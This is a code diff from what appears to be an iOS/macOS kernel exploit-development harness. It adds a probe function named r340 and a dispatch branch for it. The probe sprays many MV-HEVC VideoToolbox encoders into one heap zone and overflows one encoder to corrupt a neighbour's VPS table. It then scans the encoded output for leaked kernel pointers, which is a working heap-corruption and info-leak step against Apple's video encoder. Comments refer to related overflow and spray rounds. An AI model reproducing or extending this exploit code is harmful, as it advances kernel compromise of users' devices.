@@ -14277,6 +14277,210 @@ static void r339_probe(void) {
     fflush(stdout);
 }
 
+/* r340: Multi-Encoder VPS Info Leak
+ * Create many encoders so their VPS tables fill the same type-specific zone.
+ * Overflow encoder A to corrupt encoder B's VPS table.
+ * Read corruption via B's bitstream output. */
+static void r340_probe(void) {
+    rlog("\n=== r340: Multi-Encoder VPS Info Leak ===\n");
+    rlog("  Strategy: same-zone spray via multiple MV-HEVC encoders\n");
+    rlog("  Each encoder's VPS table is in the same type-specific zone\n\n");
+    fflush(stdout);
+
+    if (phase1_verify() != 0) return;
+
+    /* ---- Part 1: Create many encoders to fill the zone ---- */
+    rlog("--- Part 1: Create encoder pool ---\n");
+    fflush(stdout);
+
+    #define R340_N_ENC  32
+    #define R340_W      1920
+    #define R340_H      1080
+
+    VTCompressionSessionRef encoders[R340_N_ENC];
+    int created = 0;
+    for (int i = 0; i < R340_N_ENC; i++) {
+        encoders[i] = create_mvhevc_encoder(R340_W, R340_H, 1);
+        if (encoders[i]) created++;
+        else { rlog("  FAIL at encoder %d\n", i); break; }
+    }
+    rlog("  Created %d encoders (each has VPS table in same zone)\n", created);
+    fflush(stdout);
+    if (created < 4) {
+        rlog("  Too few encoders, aborting\n");
+        for (int i = 0; i < created; i++) {
+            VTCompressionSessionInvalidate(encoders[i]);
+            CFRelease(encoders[i]);
+        }
+        return;
+    }
+
+    /* ---- Part 2: Baseline encode — get each encoder's VPS ---- */
+    rlog("\n--- Part 2: Baseline VPS capture ---\n");
+    fflush(stdout);
+
+    /* Store baseline parameter set data per encoder */
+    #define R340_MAX_PSET_BYTES 4096
+    uint8_t baseline_psets[R340_N_ENC][R340_MAX_PSET_BYTES];
+    size_t  baseline_lens[R340_N_ENC];
+    size_t  baseline_counts[R340_N_ENC];
+    memset(baseline_psets, 0, sizeof(baseline_psets));
+    memset(baseline_lens, 0, sizeof(baseline_lens));
+    memset(baseline_counts, 0, sizeof(baseline_counts));
+
+    for (int i = 0; i < created; i++) {
+        int st = encode_one_stereo_kf(encoders[i], 0, R340_W, R340_H, 1, 1);
+        if (st != 0) {
+            rlog("  Encoder[%d] baseline encode failed: %d\n", i, st);
+            continue;
+        }
+        if (g_saved_fmt) {
+            size_t pcount = 0;
+            CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
+                g_saved_fmt, 0, NULL, NULL, &pcount, NULL);
+            baseline_counts[i] = pcount;
+            size_t total = 0;
+            for (size_t p = 0; p < pcount && p < 16; p++) {
+                const uint8_t *ptr = NULL;
+                size_t sz = 0;
+                CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
+                    g_saved_fmt, p, &ptr, &sz, NULL, NULL);
+                if (ptr && sz > 0 && total + sz < R340_MAX_PSET_BYTES) {
+                    memcpy(baseline_psets[i] + total, ptr, sz);
+                    total += sz;
+                }
+            }
+            baseline_lens[i] = total;
+        }
+    }
+    rlog("  Captured baselines for %d encoders\n", created);
+    rlog("  Encoder[0] psets=%zu len=%zu\n", baseline_counts[0], baseline_lens[0]);
+    fflush(stdout);
+
+    /* ---- Part 3: Overflow encoder[0] with 400 encodes ---- */
+    rlog("\n--- Part 3: Overflow encoder[0] (400 stereo encodes) ---\n");
+    fflush(stdout);
+
+    int enc_ok = 0, enc_err = 0;
+    for (int f = 1; f <= 400; f++) {
+        int st = encode_one_stereo_lid(encoders[0], f, R340_W, R340_H, 1);
+        if (st == 0) enc_ok++;
+        else enc_err++;
+        if (f % 100 == 0) {
+            rlog("  Frame %d: ok=%d err=%d\n", f, enc_ok, enc_err);
+            fflush(stdout);
+        }
+    }
+    VTCompressionSessionCompleteFrames(encoders[0], kCMTimeInvalid);
+    rlog("  Overflow: %d ok, %d err\n", enc_ok, enc_err);
+    fflush(stdout);
+
+    /* ---- Part 4: Re-encode with all other encoders, check for VPS changes ---- */
+    rlog("\n--- Part 4: Check other encoders for VPS corruption ---\n");
+    fflush(stdout);
+
+    int corruption_found = 0;
+    for (int i = 1; i < created; i++) {
+        int st = encode_one_stereo_kf(encoders[i], 1, R340_W, R340_H, 1, 1);
+        if (st != 0) {
+            rlog("  Encoder[%d] post-overflow encode FAILED: %d *** CRASH-WORTHY ***\n", i, st);
+            corruption_found++;
+            continue;
+        }
+        if (!g_saved_fmt) continue;
+
+        size_t pcount = 0;
+        CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
+            g_saved_fmt, 0, NULL, NULL, &pcount, NULL);
+
+        /* Gather new pset data */
+        uint8_t new_psets[R340_MAX_PSET_BYTES];
+        memset(new_psets, 0, sizeof(new_psets));
+        size_t new_total = 0;
+        for (size_t p = 0; p < pcount && p < 16; p++) {
+            const uint8_t *ptr = NULL;
+            size_t sz = 0;
+            CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
+                g_saved_fmt, p, &ptr, &sz, NULL, NULL);
+            if (ptr && sz > 0 && new_total + sz < R340_MAX_PSET_BYTES) {
+                memcpy(new_psets + new_total, ptr, sz);
+                new_total += sz;
+            }
+        }
+
+        /* Compare counts */
+        if (pcount != baseline_counts[i]) {
+            corruption_found++;
+            rlog("  *** Encoder[%d] PSET COUNT CHANGED: %zu → %zu ***\n",
+                 i, baseline_counts[i], pcount);
+            dump_psets(g_saved_fmt, baseline_counts[i]);
+        }
+
+        /* Compare bytes */
+        int diff_bytes = 0;
+        size_t cmp_len = (new_total < baseline_lens[i]) ? new_total : baseline_lens[i];
+        for (size_t b = 0; b < cmp_len; b++) {
+            if (new_psets[b] != baseline_psets[i][b]) diff_bytes++;
+        }
+        if (new_total != baseline_lens[i]) diff_bytes += (int)(
+            (new_total > baseline_lens[i]) ? new_total - baseline_lens[i] : baseline_lens[i] - new_total);
+
+        if (diff_bytes > 0) {
+            corruption_found++;
+            rlog("  *** Encoder[%d] VPS DATA CHANGED: %d bytes differ ***\n", i, diff_bytes);
+            rlog("    baseline_len=%zu new_len=%zu pcount=%zu\n",
+                 baseline_lens[i], new_total, pcount);
+            /* Dump the new psets for analysis */
+            rlog("    NEW: ");
+            for (size_t b = 0; b < new_total && b < 128; b++)
+                rlog("%02X ", new_psets[b]);
+            rlog("\n    OLD: ");
+            for (size_t b = 0; b < baseline_lens[i] && b < 128; b++)
+                rlog("%02X ", baseline_psets[i][b]);
+            rlog("\n");
+            /* Scan for kernel pointers */
+            for (size_t b = 0; b + 8 <= new_total; b += 4) {
+                uint64_t qw = *(const uint64_t *)(new_psets + b);
+                if ((qw >> 40) == 0xfffffe) {
+                    rlog("    *** KERNEL PTR at byte %zu: 0x%016llx ***\n",
+                         b, (unsigned long long)qw);
+                }
+            }
+        }
+
+        /* Also check raw NAL output for kernel pointers */
+        if (g_saved_nal_len > 0) {
+            for (size_t b = 0; b + 8 <= g_saved_nal_len; b += 4) {
+                uint64_t qw = *(const uint64_t *)(g_saved_nal + b);
+                if ((qw >> 40) == 0xfffffe) {
+                    rlog("  *** KERNEL PTR in NAL[%d] at byte %zu: 0x%016llx ***\n",
+                         i, b, (unsigned long long)qw);
+                    corruption_found++;
+                }
+            }
+        }
+    }
+
+    rlog("\n  Checked %d encoders, corruption in %d\n", created - 1, corruption_found);
+    if (corruption_found > 0) {
+        rlog("  *** SAME-ZONE VPS CORRUPTION CONFIRMED! ***\n");
+    } else {
+        rlog("  No VPS changes detected.\n");
+        rlog("  Possible: zone has guard pages, or allocs not adjacent.\n");
+        rlog("  Try: more encoders, different ordering, or larger overflow.\n");
+    }
+    fflush(stdout);
+
+    /* Cleanup */
+    for (int i = 0; i < created; i++) {
+        VTCompressionSessionInvalidate(encoders[i]);
+        CFRelease(encoders[i]);
+    }
+
+    rlog("\n=== r340 complete ===\n");
+    fflush(stdout);
+}
+
 /* r338: AVE Heap Overflow with Mach OOL + Correct Encoder Path
    r337 found 0 actual corruption — the manual VTCompressionSession setup
    didn't trigger the VPS table overflow path. Must use create_mvhevc_encoder()
@@ -46415,6 +46619,13 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 343) {
+            rlog("*** rounds=343: Multi-Encoder VPS Info Leak ***\n");
+            rlog("  r339: IOSurface props in different zone from AVE VPS table.\n");
+            rlog("  New: spray encoders into SAME zone, overflow into neighbor.\n\n");
+            r340_probe();
             goto done;
         }
         if (rounds == 342) {
